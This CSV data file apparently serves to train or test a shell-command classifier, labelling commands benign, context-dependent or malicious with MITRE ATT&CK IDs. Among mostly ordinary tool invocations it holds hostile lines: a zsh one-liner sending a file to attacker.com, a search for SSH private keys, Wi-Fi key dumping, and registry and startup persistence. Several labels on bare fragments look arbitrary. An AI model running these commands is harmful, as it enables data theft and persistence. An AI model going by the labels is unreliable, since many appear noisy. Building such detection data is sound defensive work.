command,label,original_label,mitre_id
pnmtotiffcmyk -msb2lsb|lsb2msb path/to/input_file.pnm > path/to/output_file.tiff,Benign,Benign,Benign
ptpython,Benign,Benign,Benign
dwebp path/to/input.webp -bmp|-tiff|-pam|-ppm|-pgm|-yuv -o path/to/output,Benign,Benign,Benign
find / -name linux,Context_Dependent,Benign,Benign
fx path/to/file.json,Benign,Benign,Benign
jj config [p|path] --workspace,Benign,Benign,Benign
quickget --url os release edition,Benign,Benign,Benign
git svn commit,Benign,Benign,Benign
lsusb [-t|--tree],Benign,Benign,Benign
shopt -s extglob find !(D) -name hi.dat,Benign,Benign,Benign
find build -not \( -path build/external -prune \) -name \*.js,Benign,Benign,Benign
npm owner add username package_name,Benign,Benign,Benign
claude prompt,Benign,Benign,Benign
wl-copy --clear,Benign,Benign,Benign
img2pdf path/to/image.ext --auto-orient --pagesize A4^T --border 2cm:5.1cm --output path/to/file.pdf,Benign,Benign,Benign
sort [-o|--output] path/to/output_file path/to/input_file,Benign,Benign,Benign
tlmgr paper --json,Benign,Benign,Benign
CreateIoCompletionPort(),Malicious,Malicious,T1486
kwrite --line line_number --column column_number path/to/file,Benign,Benign,Benign
fixfiles -B,Benign,Benign,Benign
"find /Applications/ -name ""*.java"" -print0 | xargs -0 grep -i ""TODO""",Benign,Benign,Benign
find . -name '*.log' -type f -readable ! -size 0 -exec sed -n '1{/The SAS System/q0};q1' {} \; -print,Benign,Benign,Benign
find . \( -size +700k -and -size -1000k \) -exec du -Hs {} \; 2>/dev/null,Benign,Benign,Benign
command 2> /dev/null,Benign,Benign,Benign
git switch branch_name,Benign,Benign,Benign
ntfy --help,Benign,Benign,Benign
file $(which socat 2>/dev/null),Context_Dependent,Synthetic,Synthetic
until command; do :; done,Benign,Benign,Benign
mv /path/to/temp-file /path/to/output-file,Malicious,Malicious,T1222
tookie-osint [-u|--user] username [-o|--output] json [-t|--threads] 10,Benign,Benign,Benign
GetUserSPNs.py domain/username:password -dc-ip domain_controller_ip -request,Benign,Benign,Benign
adb install -g path/to/file.apk,Benign,Benign,Benign
combine path/to/file1 and path/to/file2,Benign,Benign,Benign
/tmp/WhiteChocolateMacademiaNut/chocolate -d cookies -p 1337,Malicious,Malicious,T1539
laravel-zero new name,Benign,Benign,Benign
sudo tcpick [-i|--interface] eth0 [-C|--colors] -h 192.168.1.100 -p 80,Benign,Benign,Benign
zabbix_agentd,Benign,Benign,Benign
esxcli network diag ping,Context_Dependent,Malicious,T1018
doctl [a|apps] [l|logs] app_id,Benign,Benign,Benign
adb shell input keyevent keycode,Benign,Benign,Benign
osv-scanner --json -D|-L|-S|-r target,Benign,Benign,Benign
i3status -h,Benign,Benign,Benign
"find / -name ""*.dbf"" -exec dirname {} \; 2> /dev/null | sort -u",Context_Dependent,Benign,Benign
unset -f function_name1 function_name2,Benign,Benign,Benign
find . -mtime +1,Benign,Benign,Benign
jhsdb jstack --pid pid,Benign,Benign,Benign
sudo iscsiadm [-m|--mode] discovery [-t|--type] sendtargets [-p|--portal] ip_address,Benign,Benign,Benign
find / -name '*.xml' 2>/dev/null | head -20,Context_Dependent,Synthetic,Synthetic
"cowsay -e characters ""hello, world""",Benign,Benign,Benign
j pattern,Benign,Benign,Benign
"guile -c ""expression""",Benign,Benign,Benign
snyk wizard,Benign,Benign,Benign
duplicacy add storage_name snapshot_id storage_url,Benign,Benign,Benign
javap -help,Benign,Benign,Benign
skills [ls|list],Benign,Benign,Benign
findmnt [-x|--verify] --verbose,Context_Dependent,Benign,Benign
find . -atime +7 -print,Benign,Benign,Benign
fadvise [-h|--help],Benign,Benign,Benign
"reg add ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test"" /f",Malicious,Malicious,T1546
find . -maxdepth 4 -name 'restore.php',Benign,Benign,Benign
mat2 --inplace path/to/file,Benign,Benign,Benign
kscreen-doctor output.HDMI-A-1.enable,Benign,Benign,Benign
firewall-cmd --list-all-zones,Benign,Benign,Benign
"rundll32.exe {PATH_SMB:.dll},EntryPoint",Malicious,Malicious,T1218
debchange [-a|--append],Benign,Benign,Benign
pip config unset command.option --global|--user|--site,Benign,Benign,Benign
pnmtofiasco [-f|--config] path/to/fiascorc path/to/file.pnm > path/to/file.fiasco,Benign,Benign,Benign
az group delete [-n|--name] name,Benign,Benign,Benign
%TEMP%\result2.dat,Malicious,Malicious,T1074
tcpdump -i eth0 dst 10.10.10.10,Context_Dependent,Synthetic,Synthetic
"echo {1..3} {a..c}{dir1,dir2,dir3}",Benign,Benign,Benign
"[DllImport(""user32.dll"", CharSet=CharSet.Auto)]",Malicious,Malicious,T1491
ionic serve,Benign,Benign,Benign
/System/Library/LaunchDaemons,Malicious,Malicious,T1053
tgatoppm path/to/file.tga > path/to/output.ppm,Benign,Benign,Benign
icalBuddy --formatOutput --separateByCalendar eventsToday,Benign,Benign,Benign
cscript ospp.vbs /sethst:ip|hostname,Benign,Benign,Benign
exif path/to/image.jpg,Benign,Benign,Benign
curl https://raw.github.com/creationix/nvm/master/install.sh | sh,Benign,Benign,Benign
bosh [-e|--environment] environment upload-stemcell stemcell_file|url,Benign,Benign,Benign
cargo deb [-p|--package] package_name,Benign,Benign,Benign
"grep [option] ""text string to search” directory-path",Benign,Benign,Benign
rev test.txt | sort -k2 | rev,Benign,Benign,Benign
find . -maxdepth 1 -type d,Benign,Benign,Benign
sha256sum --ignore-missing [-c|--check] --quiet path/to/file.sha256,Benign,Benign,Benign
pnmremap [-ma|-mapfile] path/to/palette_file.ppm [-m|-missingcolor] color path/to/input.pnm > path/to/output.pnm,Benign,Benign,Benign
"find . -name ""*bills*"" -print0 | xargs -0 grep put",Benign,Benign,Benign
sudo usbip attach [-r|--remote] ip_address [-b|--busid] bus_id,Benign,Benign,Benign
systemctl try-reload-or-restart unit,Benign,Benign,Benign
joe path/to/file,Benign,Benign,Benign
Label,Malicious,Malicious,T1543
Add-Type -AssemblyName System.Windows.Forms,Malicious,Malicious,T1113
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost,Malicious,Malicious,T1547
pixi task list,Benign,Benign,Benign
chpass -u authname -s path/to/shell username,Benign,Benign,Benign
virt-xml domain --edit --option suboption=new_value,Benign,Benign,Benign
ci -u path/to/file,Benign,Benign,Benign
difft path/to/file_or_directory1 path/to/file_or_directory2,Benign,Benign,Benign
reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d $new_executable /f,Malicious,Malicious,T1112
ifconfig eth0 | grep addr: | awk '{ print $2 }' | cut -d: -f2,Context_Dependent,Benign,Benign
cargo add dependency --dev|build,Benign,Benign,Benign
"reg query ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup""",Context_Dependent,Malicious,T1012
DisplayName = $p.DisplayName,Context_Dependent,Malicious,T1007
rdfind -deleteduplicates true -ignoreempty false path/to/directory,Benign,Benign,Benign
dircolors [-b|--bourne-shell],Benign,Benign,Benign
speaker-test [-t|--test] wav [-w|--wavfile] path/to/file.wav,Benign,Benign,Benign
tv,Benign,Benign,Benign
rletopnm [--verb|--verbose] path/to/input.rle > path/to/output.pnm,Benign,Benign,Benign
qemu-img info path/to/image_file.img,Benign,Benign,Benign
find . -name '* *',Benign,Benign,Benign
sudo pvs --noheadings,Benign,Benign,Benign
pipes.sh -t 0..9,Benign,Benign,Benign
nagios4 -d,Benign,Benign,Benign
agetty [-n|--skip-login] [-l|--login-program] login_program tty,Benign,Benign,Benign
find httpdocs -type d,Benign,Benign,Benign
scp -r prod:/path/foo /home/user/Desktop,Benign,Benign,Benign
multipass info instance_name,Benign,Benign,Benign
"linode-cli tickets reply ticket_id --description ""The content of your reply""",Benign,Benign,Benign
HKCU\Software\dnimtsoleht\StubPath,Malicious,Malicious,T1547
ppmfade -f path/to/image1.ppm -l path/to/image2.ppm -mix|spread|shift|relief|oil|...,Benign,Benign,Benign
top -p 18884 -p 18892 -p 18919,Benign,Benign,Benign
git fetch [-t|--tags],Benign,Benign,Benign
"find /etc/ -iname ""*"" -type f -print0 | xargs -0 grep -H ""nameserver""",Benign,Benign,Benign
kubectl wait --for condition=available deployment/deployment_name,Benign,Benign,Benign
find . -type d -regextype posix-egrep -regex '\./processor[[:digit:]]*/10\.(1|2)',Benign,Benign,Benign
st-info --sram,Benign,Benign,Benign
"rgpt --max 300 --i ""$(git diff path/to/file)""",Benign,Benign,Benign
"diff -u A1 A2 | grep -E ""^\+""",Benign,Benign,Benign
wall [-t|--timeout] seconds file,Benign,Benign,Benign
proctl [-t|-new-template],Benign,Benign,Benign
find . -type f -exec grep -Iq . {} \; -and -print,Benign,Benign,Benign
comm -1 -2 <(sort file1) <(sort file2),Benign,Benign,Benign
nvcc path/to/source.cu [-o|--output-file] path/to/executable [-I|--include-path] path/to/includes [-L|--library-path] path/to/library [-l|--library] library_name,Benign,Benign,Benign
ascii-image-converter [-b|--braille] path/to/image|URL,Benign,Benign,Benign
"alias unix=""date +%s""",Benign,Benign,Benign
sudo f5fpc --start,Benign,Benign,Benign
duf path/to/directory1 path/to/directory2 ...,Benign,Benign,Benign
sed 'x;G;1!h;s/\n/ /g;$!d',Benign,Benign,Benign
"Copy-Item ""$PathToAtomicsFolder\T1547.001\src\jsestartup.jse"" ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse""",Malicious,Malicious,T1547
HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum,Malicious,Malicious,T1680
hg serve [-p|--port] port,Benign,Benign,Benign
kustomize edit set image busybox=alpine:3.6,Benign,Benign,Benign
swaplabel [-U|--uuid] new_uuid path/to/file,Benign,Benign,Benign
sudo lvcreate [-L|--size] 10G vg1,Benign,Benign,Benign
spike watch,Benign,Benign,Benign
rustup override unset,Benign,Benign,Benign
tar cf /dev/stdout /path/to/input-file -I 'tar xO',Context_Dependent,Malicious,T1005
New-Item -ItemType Directory -Path $storageAccountOutputPath,Malicious,Malicious,T1530
cd /home/www && find . -type f -print0 | xargs -0 perl -i.bak -pe 's/subdomainA\.example\.com/subdomainB.example.com/g',Benign,Benign,Benign
bloodhound-python --collectionmethod All --kerberos --domain domain,Benign,Benign,Benign
nth [-f|--file] path/to/hashes,Benign,Benign,Benign
kinit,Malicious,Malicious,T1558
scrcpy [-S|--turn-screen-off] [-w|--stay-awake],Benign,Benign,Benign
kreadconfig5 --file startkderc --group General --key systemdBoot,Benign,Benign,Benign
plenv local version,Benign,Benign,Benign
mmcli --modem=modem,Benign,Benign,Benign
paclock --help,Benign,Benign,Benign
"Service Control Manager/7045;winupd,%SystemRoot%\winupd.exe,user mode service,demand start,LocalSystem",Malicious,Malicious,T1569
gacutil -l,Benign,Benign,Benign
"dig +noall +answer soa yahoo.com | awk '{sub(/.$/,"""",$5);print $5}'",Benign,Benign,Benign
"zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;echo -n ""$(</path/to/input-file)"" >&$REPLY'",Malicious,Malicious,T1105
elm repl,Benign,Benign,Benign
find /usr/tom | egrep '*.pl| *.pm',Benign,Benign,Benign
sudo aptitude remove package,Benign,Benign,Benign
komac [complete|autocomplete] bash|elvish|fish|powershell|zsh,Benign,Benign,Benign
du -ksh * | sort -n -r,Benign,Benign,Benign
wormhole send path/to/file,Benign,Benign,Benign
pwgen [-s|--secure],Benign,Benign,Benign
"find . -name ""*.txt"" -printf ""%f\n"" > /tmp/a",Benign,Benign,Benign
systemsetup -setsleep off -setrestartpowerfailure on -setrestartfreeze on,Benign,Benign,Benign
eselect news purge,Benign,Benign,Benign
steghide embed [-cf|--coverfile] path/to/image.jpg [-ef|--embedfile] path/to/data.txt [-e|--encryption] blowfish|... cbc|...,Benign,Benign,Benign
netsh wlan show profile * key=clear,Context_Dependent,Malicious,T1016
xmodmap -e 'keycode keycode =',Benign,Benign,Benign
security-checker security:check path/to/composer.lock,Benign,Benign,Benign
mount | tail -1 | sed 's/ on .* ([^)]*)$//',Context_Dependent,Benign,Benign
qemu-system-x86_64 -hda image_name.img -m 4096 -nographic,Benign,Benign,Benign
if (-Not (Test-Path -Path $folderPath)) {,Malicious,Malicious,T1105
cd $(find . -name config -type d | sed 1q),Benign,Benign,Benign
swaks [-t|--to] user@example.com [-s|--server] test-server.example.net,Benign,Benign,Benign
buku [-w|--write] bookmark_id,Benign,Benign,Benign
"Rename-Item -Path ""path\to\file"" -NewName ""new_file_name"" [-Confirm|-cf]",Benign,Benign,Benign
sudo prosodyctl adduser user@example.com,Benign,Benign,Benign
"find ""$root"" -name "".[a-z]*"" -prune -o -type d -printf '%p:'",Benign,Benign,Benign
locust [-H|--host] http://example.com,Benign,Benign,Benign
scriptlive path/to/timing_file path/to/typescript --maxdelay 2,Benign,Benign,Benign
logrotate path/to/logrotate.conf --mail /usr/bin/mail_command,Benign,Benign,Benign
bluetoothctl pair mac_address,Benign,Benign,Benign
npm [ls|list] --json,Benign,Benign,Benign
find -name '*~' -delete,Benign,Benign,Benign
"ansiweather -u metric -f 7 -l Rzeszow,PL",Benign,Benign,Benign
rustup-init.sh --profile minimal|default|complete,Benign,Benign,Benign
"git ls-files | grep -vE ""(png|jpg|ico)"" | xargs wc -l",Benign,Benign,Benign
tlmgr option setting,Benign,Benign,Benign
xrdb,Benign,Benign,Benign
sc query service_name,Benign,Benign,Benign
"ia search 'subject:""subject"" collection:collection'",Benign,Benign,Benign
biff tag lines /tmp/access.log | biff time in system | biff time fmt [-f|--format] '%c' | head [-n|--lines] 3 | biff untag [-s|--substitute],Benign,Benign,Benign
find . -name “*.jpg”,Benign,Benign,Benign
enscript path/to/input_file [-o|--output] path/to/output_file,Benign,Benign,Benign
"animdl stream ""anime_title"" [-s|--special] latest",Benign,Benign,Benign
echo -n `hostname`,Benign,Benign,Benign
opencode mcp logout server_name,Benign,Benign,Benign
sudo sv up path/to/service,Benign,Benign,Benign
pm list packages -3,Benign,Benign,Benign
p5 server,Benign,Benign,Benign
ng [b|build] --verbose,Benign,Benign,Benign
"New-ItemProperty -Path HKCU:\Environment -Name ""COR_PROFILER_PATH"" -PropertyType String -Value ""$file_name"" -Force | Out-Null",Malicious,Malicious,T1574
dconf list /path/to/directory/,Benign,Benign,Benign
kdash [-d|--debug],Benign,Benign,Benign
flips,Benign,Benign,Benign
keepassxc-cli add [-g|--generate] path/to/database_file entry_name,Benign,Benign,Benign
grype image:tag,Benign,Benign,Benign
sudo lastb,Benign,Benign,Benign
find . -name *.bar -maxdepth 2 -print,Benign,Benign,Benign
starship module --list,Benign,Benign,Benign
Dim schTasksCmd As String,Malicious,Malicious,T1137
hunspell -d en_US path/to/file,Benign,Benign,Benign
ludusavi backups --path path/to/backup,Benign,Benign,Benign
echo data.txt | mosquitto_pub [-t|--topic] sensors/temperature [-l|--stdin-line],Benign,Benign,Benign
rfetch -a,Benign,Benign,Benign
Get-Alias,Benign,Benign,Benign
abrt-action-analyze-c,Benign,Benign,Benign
"find foldername -exec chmod a+rwx {} "";""",Context_Dependent,Benign,Benign
cupsd -t -c path/to/cupsd.conf,Benign,Benign,Benign
select line in $(command); do echo $line; done,Benign,Benign,Benign
ghcup install ghc version,Benign,Benign,Benign
sshuttle -r user@10.0.0.1 0/0,Context_Dependent,Synthetic,Synthetic
ctr containers list,Benign,Benign,Benign
pixterm -s 2 path/to/file,Benign,Benign,Benign
diff-pdf --view path/to/a.pdf path/to/b.pdf,Benign,Benign,Benign
find . -type d -exec chown username {} \;,Benign,Benign,Benign
foreach($password in $passwords) {,Malicious,Malicious,T1110
find sourceDir -mindepth 1 -print0 | xargs -0 mv --target-directory=destDir,Benign,Benign,Benign
dphys-swapfile setup,Benign,Benign,Benign
"zcat file.gz | awk -v RS=""-----------\n"" '/A=2[ ,\n]/ && /dummy=2[ ,\n]/{count++} !/dummy=2[ ,\n]/{other++} END{print ""Final counter value="",count, ""; other="", other}'",Benign,Benign,Benign
wrangler publish,Benign,Benign,Benign
"qm set 100 --delete device_name0,device_name1,...",Benign,Benign,Benign
http [-f|--form] POST https://example.com/upload cv@path/to/file,Benign,Benign,Benign
vale path/to/file,Benign,Benign,Benign
cat myfile,Benign,Benign,Benign
k8sec dump [-f|--filename] path/to/file secret_name,Benign,Benign,Benign
"openai api chat_completions.create --model gpt-3.5-turbo --message user ""Hello world""",Benign,Benign,Benign
"find . -regextype posix-egrep -regex "".+\.(c|cpp|h)$"" | xargs -n 1 ls",Benign,Benign,Benign
mpstat 2,Benign,Benign,Benign
cotton -u base_url path/to/file.md,Benign,Benign,Benign
guacd -C my-cert.crt -K my-key.pem,Benign,Benign,Benign
amdgpu_top --smi,Benign,Benign,Benign
patchwork -T svg -o path/to/image.svg path/to/input.gv,Benign,Benign,Benign
wget [-P|--directory-prefix] path/to/directory [-i|--input-file] path/to/URLs.txt,Benign,Benign,Benign
cat /var/log/messages,Context_Dependent,Synthetic,Synthetic
ssh -fN -L 8080:192.168.1.1:80 user@192.168.1.1,Context_Dependent,Synthetic,Synthetic
st-flash read firmware.bin 0x8000000 4096,Benign,Benign,Benign
tuned-adm recommend,Benign,Benign,Benign
pnmhistmap [-l|-lval] minval [-rv|-rval] maxval path/to/input.pnm > path/to/output.pnm,Benign,Benign,Benign
ppmhist [-v|-version],Benign,Benign,Benign
"$ADSearch.Filter=""(l=$keyObjectGuid)""",Malicious,Malicious,T1552
uvcdynctrl [-g|--get] control_name,Benign,Benign,Benign
moro report --all,Benign,Benign,Benign
asar [p|pack] path/to/input_file_or_directory path/to/output_archive.asar,Benign,Benign,Benign
pax -w path/to/file1 path/to/file2 ... > target.tar,Benign,Benign,Benign
memray flamegraph path/to/file.bin,Benign,Benign,Benign
C:\Windows\System32\cmd.exe /c net view /all,Context_Dependent,Malicious,T1135
nmap -sU 10.10.10.50,Context_Dependent,Synthetic,Synthetic
open -n -b com.domain.application,Benign,Benign,Benign
autoexpect -f path/to/file command,Benign,Benign,Benign
"foreach ($machine in get-content -path ""$machine_list"")",Malicious,Malicious,T1105
"find -name ""*.txt"" -print0 | xargs -0 rm",Benign,Benign,Benign
"pbmtextps [-du|-dump-ps] ""Hello World!"" > path/to/output.ps",Benign,Benign,Benign
systemd-daemon,Malicious,Malicious,T1036
aws iam list-access-keys --user-name user_name,Benign,Benign,Benign
rabbitmq-diagnostics log_tail --number n --node node,Benign,Benign,Benign
handlr get .png,Benign,Benign,Benign
grep -i error /var/log/cron,Context_Dependent,Synthetic,Synthetic
installer -dominfo [-pkg|-package] path/to/package.pkg,Benign,Benign,Benign
scala-cli --scala 3.1.0 --jvm temurin:17,Benign,Benign,Benign
"find . -name ""*.andnav"" | rename ""s/\.andnav$/.tile/""",Benign,Benign,Benign
find . -name '*.py' | xargs grep some_function,Benign,Benign,Benign
nxc smb|ssh|ldap|ftp|wmi|winrm|rdp|vnc|mssql [-M|--module] module_name --options,Benign,Benign,Benign
git < path/to/tree.txt mktree,Benign,Benign,Benign
"whence -c ""command""",Benign,Benign,Benign
cloudflared tunnel route dns name|uuid hostname,Benign,Benign,Benign
plasma-apply-cursortheme breeze_cursors,Benign,Benign,Benign
find -mtime 0 -not \( -name '*.swp' -o -path './es*' -o -path './en*' \),Benign,Benign,Benign
imp [-s|--shell],Benign,Benign,Benign
papermc start,Benign,Benign,Benign
df -P file/goes/here | tail -1 | cut -d' ' -f 1,Benign,Benign,Benign
find / -name ssh|grep bin|xargs dirname,Context_Dependent,Benign,Benign
find /path/to/files -exec truncate.sh {} \;,Benign,Benign,Benign
mongorestore --db database_name path/to/directory,Benign,Benign,Benign
oc get pods,Benign,Benign,Benign
/usr/bin/find ./ $*,Benign,Benign,Benign
pmount,Benign,Benign,Benign
stolonctl --cluster-name cluster_name --store-backend store_backend --store-endpoints store_endpoints clusterdata,Benign,Benign,Benign
find dir -type f -print0 | xargs -0 md5sum >> file.txt,Benign,Benign,Benign
"mcfly move ""path/to/old_directory"" ""path/to/new_directory""",Benign,Benign,Benign
gst-launch-1.0 videotestsrc ! pipewiresink mode=provide,Benign,Benign,Benign
ippfind --txt-pdl application/postscript [-x|--exec] ipptool -f path/to/document.ps '{}' print-job.test \;,Benign,Benign,Benign
eject /dev/cdrom,Benign,Benign,Benign
gpg-card passwd,Benign,Benign,Benign
kubectl cluster-info dump,Context_Dependent,Benign,Benign
"for l in $(find . -type l); do cd $(dirname $l); if [ ! -e ""$(readlink $(basename $l))"" ]; then echo $l; fi; cd - > /dev/null; done",Benign,Benign,Benign
ruby -I path/to/library_folder -r library_require_name path/to/bin_folder/bin_name,Benign,Benign,Benign
sudo arptables [-D|--delete] INPUT rule_number,Benign,Benign,Benign
pwsh -InputFormat Text|XML,Benign,Benign,Benign
manim --list_scenes path/to/file.py,Benign,Benign,Benign
docker system df [-v|--verbose],Benign,Benign,Benign
find -type l,Benign,Benign,Benign
pulseaudio [-k|--kill],Benign,Benign,Benign
echo 'Zone Test 2:00 Jordan CE%sT' >>/path/to/temp-file,Malicious,Malicious,T1059
blender [-b|--background] path/to/file.blend --python-expr 'import bpy; bpy.data.scenes[0].render.resolution_percentage = 25' [-a|--render-anim],Benign,Benign,Benign
7zr a path/to/archive.7z path/to/file_or_directory,Benign,Benign,Benign
rails db:drop,Benign,Benign,Benign
pprof -top ./fibbo ./fibbo-profile.pb.gz,Benign,Benign,Benign
behat --out path/to/file,Benign,Benign,Benign
journalctl [-b|--boot] -1 [-p|--priority] 3,Benign,Benign,Benign
mytop [-u|-user] user [-p|-password] password --noidle,Benign,Benign,Benign
pacrepairdb package_name,Benign,Benign,Benign
consent.exe,Malicious,Malicious,T1134
pip freeze,Benign,Benign,Benign
gdb [-c|--core] path/to/core path/to/executable -iex 'set debuginfod enabled on' -iex 'set pagination off' -ex bt,Benign,Benign,Benign
i3exit suspend,Benign,Benign,Benign
lvmpolld [-p|--pidfile] /tmp/lvmpolld.pid,Benign,Benign,Benign
bun why package_name --depth number,Benign,Benign,Benign
find . -name aaa -print,Benign,Benign,Benign
opencode export,Benign,Benign,Benign
cat $output_file,Malicious,Malicious,T1003
wlc [-f|--format] text|csv|json|html ls project/component,Benign,Benign,Benign
find /srv -writable -type f 2>/dev/null,Context_Dependent,Synthetic,Synthetic
find /etc -name '*.conf' -type f,Context_Dependent,Synthetic,Synthetic
"pamtogif [-c|-comment] ""Hello World!"" path/to/image.pam > path/to/output.gif",Benign,Benign,Benign
spotify next,Benign,Benign,Benign
"find . -name ""*.rb"" -type f -exec chmod 600 {} \;",Benign,Benign,Benign
"find . -name ""*sh*""",Benign,Benign,Benign
gh release upload tag path/to/file1 path/to/file2 ...,Benign,Benign,Benign
find . -mtime -1,Benign,Benign,Benign
echo $filename | rev | cut -f 2- -d '.' | rev,Benign,Benign,Benign
xzless path/to/file,Benign,Benign,Benign
mongoimport --type csv --file path/to/file.csv [-d|--db] database_name [-c|--collection] collection_name,Benign,Benign,Benign
"echo `echo ""Ho ho ho""` | od -c",Benign,Benign,Benign
iperf3 [-c|--client] server,Benign,Benign,Benign
kwriteconfig5 --help,Benign,Benign,Benign
pulumi env init environment_name,Benign,Benign,Benign
set `od -j $o -N 8 -t u1 $pkg`,Benign,Benign,Benign
read dir,Benign,Benign,Benign
"mount /mnt/mountpoint -oremount,rw",Context_Dependent,Benign,Benign
deluged,Benign,Benign,Benign
kubectx,Benign,Benign,Benign
var host='attacker.com';,Malicious,Malicious,T1059
hcloud context,Benign,Benign,Benign
rcs -orevision path/to/file,Benign,Benign,Benign
zed path/to/file_or_directory1 path/to/file_or_directory2 ...,Benign,Benign,Benign
shutdown -h 1300,Benign,Benign,Benign
echo $TERM,Context_Dependent,Synthetic,Synthetic
openssl s_client -connect host:port 2>/dev/null | openssl x509 -noout -dates,Benign,Benign,Benign
vagrant up,Benign,Benign,Benign
malware,Malicious,Malicious,T1564
pamfile path/to/file1 path/to/file2 ...,Benign,Benign,Benign
alias devn='cat > /dev/null',Benign,Benign,Benign
x11vnc -forever -viewonly,Benign,Benign,Benign
"webtorrent download ""torrent_id""",Benign,Benign,Benign
bc --expression '5 / 3',Benign,Benign,Benign
gcalcli --calendar calendar_name agenda,Benign,Benign,Benign
qm set 100 --cores 4,Benign,Benign,Benign
flarectl ips --ip-type ipv4|ipv6|all,Benign,Benign,Benign
getST.py,Malicious,Malicious,T1558
fscrypt unlock path/to/encrypted_directory,Benign,Benign,Benign
apt-key adv --keyserver pgp.mit.edu --recv KEYID,Benign,Benign,Benign
cadaver http://dav.example.com/,Benign,Benign,Benign
mklink /j path\to\link_file path\to\source_file,Benign,Benign,Benign
/lib/udev/rules.d/,Malicious,Malicious,T1546
as path/to/file.s,Benign,Benign,Benign
ptyxis [-d|--working-directory] path/to/directory --tab,Benign,Benign,Benign
"scheme --eval ""(define foo 'x)""",Benign,Benign,Benign
detox [-n|--dry-run] -r path/to/directory,Benign,Benign,Benign
"{if($user.$prop -like ""*password*"")",Malicious,Malicious,T1552
linode-cli linodes backups-list linode_id,Benign,Benign,Benign
bun build path/to/entry.ts --outfile path/to/output.js --watch,Benign,Benign,Benign
aws command help,Benign,Benign,Benign
links -anonymous https://example.com,Benign,Benign,Benign
find $search_path -name id_rsa 2>/dev/null >> $output_file,Malicious,Malicious,T1552
"locate ""pattern""",Benign,Benign,Benign
jc pattern,Benign,Benign,Benign
nmap --script=smb-enum-shares 10.0.0.100,Context_Dependent,Synthetic,Synthetic
mix new project_name,Benign,Benign,Benign
"dialog --yesno ""Continue?"" 7 40",Benign,Benign,Benign
aws s3 mb s3://bucket_name --region region,Benign,Benign,Benign
"paste -d"" "" file1 file2 | paste -d'|' - file3 | sed 's,|, ,g'",Benign,Benign,Benign
fast --verbose,Benign,Benign,Benign
pnmpsnr path/to/file1.pnm path/to/file2.pnm -rgb -target1 threshold_red -target2 threshold_green -target3 threshold_blue,Benign,Benign,Benign
tcpdump -i eth0 dst 10.0.0.100,Context_Dependent,Synthetic,Synthetic
ccomps path/to/input1.gv path/to/input2.gv ... > path/to/output.gv,Benign,Benign,Benign
conda info [-s|--system],Benign,Benign,Benign
bandwhich [-t|--total-utilization],Benign,Benign,Benign
fuser port/tcp,Benign,Benign,Benign
bun unlink --cwd path/to/package,Benign,Benign,Benign
ned --colors never '^[dl]og' .,Benign,Benign,Benign
New-Item -ItemType SymbolicLink|HardLink|Junction -Path path\to\link_file -Target path\to\source_file_or_directory,Benign,Benign,Benign
rabbitmq-streams add_replica stream node,Benign,Benign,Benign
nix-channel --list,Benign,Benign,Benign
resolvectl --legend no [-t|--type] MX query domain,Benign,Benign,Benign
dd if=/dev/drive_device of=path/to/file.img status=progress,Benign,Benign,Benign
terraform plan -destroy,Benign,Benign,Benign
vpnd -h,Benign,Benign,Benign
hatch dep show table,Benign,Benign,Benign
sudo ln -s /usr/lib/jvm/java-7-oracle /usr/lib/jvm/default-java,Benign,Benign,Benign
"xml [esc|escape] ""<a1>""",Benign,Benign,Benign
e2image -Q /dev/sdXN path/to/image_file,Benign,Benign,Benign
"stat -f ""%Su %Sg"" path/to/file",Benign,Benign,Benign
sudo bclm unpersist,Benign,Benign,Benign
ip [st|stats] show dev network_interface,Benign,Benign,Benign
PTRACE_POKEDATA,Malicious,Malicious,T1055
dark-mode off,Benign,Benign,Benign
"New-Item -ItemType Key -Path ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer""",Malicious,Malicious,T1547
az container delete [-n|--name] name [-g|--resource-group] resource_group,Benign,Benign,Benign
"find -x data -name ""filepattern-*2009*"" -print0 > filesOfInterest.txt",Benign,Benign,Benign
foreach ($account in $storageAccounts) {,Context_Dependent,Malicious,T1619
zabbix_server [-c|--config] path/to/zabbix_server.conf,Benign,Benign,Benign
find . -type d | xargs chmod 2775,Context_Dependent,Benign,Benign
